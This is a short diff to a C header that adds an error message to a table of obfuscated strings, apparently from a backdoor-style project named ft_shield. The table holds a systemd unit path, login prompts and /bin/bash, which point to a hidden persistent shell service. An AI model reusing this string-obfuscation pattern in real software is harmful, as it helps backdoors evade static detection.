@@ -16,6 +16,7 @@ typedef enum ObfuscatedStringTableIndex {
     INVALID_PASSWORD_TRY_AGAIN,
     LOGIN_SUCCESSFUL,
     BIN_BASH,
+    TOO_MANY_CONNECTIONS,
 } ObfuscatedStringTableIndex;
 
 // Will be preprocessed for codegen by scripts/encode.py
@@ -32,7 +33,7 @@ static uint8_t systemd_config_path[] = OBFUSCATE("/etc/systemd/system/ft_shield.
 static uint8_t invalid_password_try_again[] = OBFUSCATE("Invalid password, try again\n");
 static uint8_t login_successful[] = OBFUSCATE("Login successful\n");
 static uint8_t bin_bash[] = OBFUSCATE("/bin/bash");
-
+static uint8_t too_many_connections[] = OBFUSCATE("Too many connections already in use\n");
 
 static ObfuscatedStringTableEntry strings[] = {
     {.data = (uint8_t *)proc_self_exe,              .len = sizeof(proc_self_exe),              .decoded = false},
@@ -46,6 +47,7 @@ static ObfuscatedStringTableEntry strings[] = {
     {.data = (uint8_t *)invalid_password_try_again, .len = sizeof(invalid_password_try_again), .decoded = false},
     {.data = (uint8_t *)login_successful,           .len = sizeof(login_successful),           .decoded = false},
     {.data = (uint8_t *)bin_bash,                   .len = sizeof(bin_bash),                   .decoded = false},
+    {.data = (uint8_t *)too_many_connections,       .len = sizeof(too_many_connections),       .decoded = false},
 };
 
 #endif
